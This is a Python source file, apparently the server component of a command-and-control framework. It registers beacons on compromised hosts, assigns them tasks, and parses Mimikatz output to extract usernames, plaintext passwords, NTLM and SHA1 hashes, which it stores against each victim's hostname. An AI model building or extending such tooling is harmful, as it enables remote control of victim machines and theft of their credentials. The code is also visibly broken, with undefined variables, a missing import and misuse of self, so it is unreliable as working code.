from flask import request
from app.models import *
from app.validators import Existance
from app.operations import Beacon
import magic, base64, os

class Beacon:
    def pulse(post_data, remote_ip, channel='http'):
        verify_beacon = Existance.beacon(post_data['beacon_id'])
        if verify_beacon['result'] == "failed":
            save_first_beacon = Process.first_beacon(post_data, remote_ip)

        if 'tasks' in post_data:
            task_results = post_data['tasks']
            Process.task(task_results, post_data['beacon_id'], post_data, remote_ip)

        if "timer" in post_data:
            new_timer = float(post_data['timer'])
            Beacon.change_timer(post_data['beacon_id'], new_timer)

        process_message = process_pulse(post_data, beaconip)
        available_tasks = Existance.tasks(post_data['beaconid'], post_data, remote_ip)
        return available_tasks


class Process:
    def pulse(post_data, remote_ip):
        create_history = Beacon.pulse(post_data['beacon_id'], remote_ip, post_data['data'])
        return create_history

    def first_beacon(post_data, remote_ip):
        beacon_id = post_data['beacon_id']
        platform = post_data['platform']
        beacon_data = post_data['data']
        timer = post_data['timer']
        create_beacon = Beacon.create(beacon_id, platform, timer, beacon_data)
        startup_tasks = StartupTasks.objects.get(platform=platform)
        for tasks in startup_tasks:
            task_id = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(10))
            create_tasks = Tasks.create(beacon_id, tasks.command.name, tasks.input, task_id)
                        
    def task(task_result, beacon_id, post_data, remote_ip):
        for taskResult in taskResults:
            task_id = task_result['task_id']
            task_res = task_result['output']
            task_res = base64.b64decode(task_res)
            task_enddate = datetime.datetime.now()

            le_magic = magic.Magic(mime=True)
            le_magic_type = le_magic.from_buffer(task_res)
            task_ref = Tasks.objects.get(task_id=task_id)
            task_ref.update(set__taskStatus="Processed")

            if task_ref.name == 'exec_shell':
                le_magic_type = "text/plain"

            save_task = addTaskResultOperation(beacon_id, task_d, task_enddate, task_res, le_magic_type)
            if 'mimikatz(powershell)' in task_res:
                self.mimikatz(beacon_id, task_res, post_data)


    def mimikatz(beacon_id, task_res, post_data):
        # Double code, requires cleanup
        match = re.findall(r'(Username : (.*)\n.*Domain.*: (.*)\n.*((Password.*: (.*))|(NTLM.*: (.*)\n.*SHA1.*: (.*))))', task_res)
        mimikat_results = []
        for pattern in match:
            result = {}
            if not pattern[1] == '(null)':
                result['username'] = pattern[1]
                if (pattern[5] !='') and (pattern[5] != '(null)'):
                    result['password'] = pattern[5]
                if (pattern[7] !='') and (pattern[7] != '(null)'):
                    result['ntlm'] = pattern[7]
                if (pattern[8] !='') and (pattern[8] != '(null)'):
                    result['sha1'] = pattern[8]
            if ('password' in result) or ('sha1' in result) or ('ntlm' in result):
                mimikat_results.append(result)
        store_mimikatz(mimikat_result, 'Mimikatz')


    def credentials(beacon_id, post_data, mimikat_results, application_name):
        for credential in mimikat_results:
            if 'ntlm' in cred:
                add_creds = Beacon.store_creds(beacon_id, post_data['data']['hostname'], application_name, credential['username'], credential['ntlm'], 'ntlm')
            if 'password' in cred:
                add_creds = Beacon.store_creds(beacon_id, post_data['data']['hostname'], application_name, credential['username'], credential['password'], 'password')
            if 'sha1' in cred:
                add_creds = Beacon.store_creds(beacon_id, post_data['data']['hostname'], application_name, credential['username'], credential['sha1'], 'sha1')
